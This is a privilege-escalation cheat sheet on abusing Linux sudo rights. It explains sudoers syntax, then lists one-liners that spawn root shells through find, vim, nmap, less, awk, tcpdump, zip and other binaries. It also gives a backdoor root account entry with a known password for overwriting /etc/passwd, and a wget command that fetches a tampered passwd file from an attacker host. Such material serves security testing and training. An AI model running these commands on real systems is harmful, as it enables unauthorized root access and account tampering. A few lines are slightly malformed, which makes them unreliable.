# Background
- Substitute User and Do 
- Users can execute command under root (or other users) using their own passwords instead of root’s one or without password depending upon sudoers setting.
- Settings for the local Host are defined in the /etc/sudoers/ file.

# Syntax
User Terminals =(Acting as user) Allowed Command 
Examples:
```
root ALL=(ALL) ALL 
```
  - Root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.
```
touhid ALL= /sbin/poweroff 
```
  - Touhid can from any terminal, run the command power off using touhid’s user password.
```
touhid ALL = (root) NOPASSWD: /usr/bin/find 
```
  - Touhid can from any terminal, run the command find as root user without password.

# Attack Vector
1. Display the SUDO commands available to the current user.
```
sudo -l
```
2. Identify Vulnerable Binaries
[GTFOBins](https://gtfobins.github.io/)
## CP
Copy and overwrite the /etc/shadow/ file with a new entry for a root user.
```
Newuser:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
```
  - Password is "test".
## Find
```
sudo find /etc/passwd -exec /bin/sh \; 
sudo find /bin -name nano -exec /bin/sh \; 
sudo find / -exec bash -i \; 
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 
```
## Vim
```
sudo vim -c '!sh'
```
## Nmap
### Old Way
```
sudo nmap --interactive 
nmap> !sh 
```
  - Note : nmap –interactive option not available in latest nmap.
### New Way
```
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```
## Man
```
sudo man man
```
  - After that press !sh and hit enter.
## Less/More
```
sudo less /etc/hosts
```
  - After that press !sh and hit enter. 
```
sudo more /etc/hosts 
```
  - After that press !sh and hit enter.
## AWK
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
## Nano
A text editor that can be used to overwrite the passwd file with a new root user and predefined password.
```
sudo nano  /etc/passwd 
Newuser:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
Su newuser
```
  - Password is "test".
## Wget
You can download a copy of the target passwd file, change it, then re-upload it to the target machine.
1. Send the passwd file from the target box to your attacker box through various transfer means.
2. Add a new root user with a password of "test".
```
Newuser:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
```
3. Re-upload the passwd file from the attacker box to the target box.
```
sudo wget [attacker IP]:[port]/passwd -O /etc/passwd
```
## Apache
Can't get a shell with this binary but can display file contents.
```
sudo apache2 -f /etc/shadow/
```
## Mount
```
sudo mount -o bind /bin/bash /bin/mount 
sudo mount 
```
## TCPdump
```
echo $’id\ncat /etc/shadow’ > /tmp/.test 
Chmod +x /tmp/.test 
Sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
## ZIP
```
Sudo zipfile.zip [random text file]  -T –-unzip-command="sh –c /bin/bash"
```
